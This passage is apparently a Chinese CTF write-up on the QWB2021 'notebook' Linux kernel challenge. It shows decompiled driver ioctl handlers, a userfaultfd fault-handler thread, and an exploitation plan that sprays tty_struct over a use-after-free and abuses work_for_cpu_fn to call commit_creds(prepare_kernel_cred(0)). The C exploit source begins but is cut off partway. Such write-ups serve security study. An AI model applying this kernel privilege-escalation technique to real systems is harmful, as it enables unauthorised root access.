class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="comment">// 轮询uffd读到的信息需要存在一个struct uffd_msg对象中</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="comment">// ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line">      ......</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123; <span class="comment">// 此线程不断进行polling，所以是死循环</span></span><br><span class="line">        <span class="comment">// poll需要我们构造一个struct pollfd对象</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// 读出user-fault相关信息</span></span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="comment">// 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件</span></span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">        <span class="comment">// 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中</span></span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例题：QWB2021-notebook"><a href="#例题：QWB2021-notebook" class="headerlink" title="例题：QWB2021-notebook"></a>例题：QWB2021-notebook</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -nographic \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic \</span><br><span class="line">    -device e1000 \</span><br><span class="line">    -smp cores=2,threads=2 \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -monitor /dev/null 2&gt;/dev/null \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>保护开启了smep，smap，kaslr进入系统可以看到还开启了kpti。</p><p>题目就是一个菜单堆题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">mynote_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    userarg notearg; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(file *))_fentry__)(file);</span><br><span class="line">    copy_from_user(&amp;notearg, v3, <span class="number">0x18</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">0x100</span> )</span><br><span class="line">        <span class="keyword">return</span> noteadd(notearg.idx, notearg.size, notearg.buf);</span><br><span class="line">    <span class="keyword">if</span> ( cmd &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cmd == <span class="number">0x64</span> )</span><br><span class="line">            <span class="keyword">return</span> notegift(notearg.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cmd == <span class="number">0x200</span> )</span><br><span class="line">            <span class="keyword">return</span> notedel(notearg.idx);</span><br><span class="line">        <span class="keyword">if</span> ( cmd == <span class="number">0x300</span> )</span><br><span class="line">            <span class="keyword">return</span> noteedit(notearg.idx, notearg.size, notearg.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;[x] Unknown ioctl cmd!\n&quot;</span>, notearg.size, notearg.buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-100LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">noteadd</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> size, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v4; <span class="comment">// r13</span></span><br><span class="line">    note *v5; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">size_t</span> v6; <span class="comment">// r14</span></span><br><span class="line">    __int64 v7; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(idx);</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = <span class="number">-1LL</span>;</span><br><span class="line">        printk(<span class="string">&quot;[x] Add idx out of range.\n&quot;</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        v4 = v3;</span><br><span class="line">        v5 = &amp;notebook[idx];</span><br><span class="line">        raw_read_lock(&amp;lock);</span><br><span class="line">        v6 = v5-&gt;size;</span><br><span class="line">        v5-&gt;size = size;</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0x60</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v5-&gt;size = v6;</span><br><span class="line">            v7 = <span class="number">-2LL</span>;</span><br><span class="line">            printk(<span class="string">&quot;[x] Add size out of range.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">            <span class="keyword">if</span> ( v5-&gt;note )</span><br><span class="line">            &#123;</span><br><span class="line">                v5-&gt;size = v6;</span><br><span class="line">                v7 = <span class="number">-3LL</span>;</span><br><span class="line">                printk(<span class="string">&quot;[x] Add idx is not empty.\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                v5-&gt;note = (<span class="keyword">void</span> *)_kmalloc(size, <span class="number">0x24000C0</span>LL);</span><br><span class="line">                printk(<span class="string">&quot;[+] Add success. %s left a note.\n&quot;</span>, name);</span><br><span class="line">                v7 = <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        raw_read_unlock(&amp;lock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在create函数里，是首先将对应位置的size放到栈上，随后直接把输入的size放到了储存size的地址，并且接着就是一个copy_from_user。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">noteedit</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> newsize, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v4; <span class="comment">// r13</span></span><br><span class="line">    note *v5; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7; <span class="comment">// r12</span></span><br><span class="line">    __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(idx);</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="number">-1LL</span>;</span><br><span class="line">        printk(<span class="string">&quot;[x] Edit idx out of range.\n&quot;</span>, newsize);</span><br><span class="line">        <span class="keyword">return</span> v8;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v5 = &amp;notebook[idx];</span><br><span class="line">    raw_read_lock(&amp;lock);</span><br><span class="line">    size = v5-&gt;size;</span><br><span class="line">    v5-&gt;size = newsize;</span><br><span class="line">    <span class="keyword">if</span> ( size == newsize )</span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> editout;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = (*(__int64 (__fastcall **)(<span class="keyword">void</span> *, <span class="keyword">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v5-&gt;size )</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">        v5-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> editout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line">    &#123;</span><br><span class="line">        v5-&gt;note = (<span class="keyword">void</span> *)v7;</span><br><span class="line">        v8 = <span class="number">2LL</span>;</span><br><span class="line">        editout:</span><br><span class="line">        raw_read_unlock(&amp;lock);</span><br><span class="line">        printk(<span class="string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> v8;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;[x] Return ptr unvalid.\n&quot;</span>);</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到虽然在create函数存在size的验证，但是在edit函数不存在任何验证，并且一样是在krealloc之后就有一个copy_from_user。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">notegift</span><span class="params">(<span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _fentry__(buf);</span><br><span class="line">    printk(<span class="string">&quot;[*] The notebook needs to be written from beginning to end.\n&quot;</span>);</span><br><span class="line">    copy_to_user(buf, notebook, <span class="number">0x100</span>LL);</span><br><span class="line">    printk(<span class="string">&quot;[*] For this special year, I give you a gift!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">100LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的gift函数就是把所有堆地址给泄露出来。</p><h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a><strong>利用分析</strong></h4><p>那么就上面分析出来的结果可以得出目前的利用思路就是，首先利用userfaultfd机制形成一个UAF的堆块，然后利用结构中含有指针的结构体进行堆喷，那么我们就可以进一步的泄漏出地址出来。下一步就是我们可以修改指针进行栈迁移，我们可以把ROP链写在另外一个堆上面，因为可以泄露堆地址的缘故所以我们可以直接栈迁移到写了ROP链的堆上面。这里使用的结构体是tty_struct，其中有tty_operations是一个类似于vtable的函数表，所以我们利用三个堆块即可完成利用。</p><p>上面是常规思路，这里主要写一下新的思路。</p><p>内核中存在这样一个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(<span class="keyword">void</span> *);</span><br><span class="line">    <span class="keyword">void</span> *arg;</span><br><span class="line">    <span class="keyword">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_for_cpu_fn</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, struct work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面函数在编译过后表达的形式其实是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_for_cpu_fn</span><span class="params">(<span class="keyword">size_t</span> * args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    args[<span class="number">6</span>] = ((<span class="keyword">size_t</span> (*) (<span class="keyword">size_t</span>)) (args[<span class="number">4</span>](args[<span class="number">5</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。</p><p>所以这里只需要用到两个堆块，第一个堆块我们要形成一个size为0x2e0的UAF堆块，第二个堆块没有要求。使用堆喷让tty_struct喷到我们的UAF堆块，但是我们需要确认他是否成功了，在tty_struct的第一个成员是一个魔数，我们可以利用他进行判断。随后修改tty_operations指针指向另外一个堆块，紧接着根据上面的函数中的偏移修改tty_struct的内容即可</p><h4 id="综上，得出exp"><a href="#综上，得出exp" class="headerlink" title="综上，得出exp"></a><strong>综上，得出exp</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | 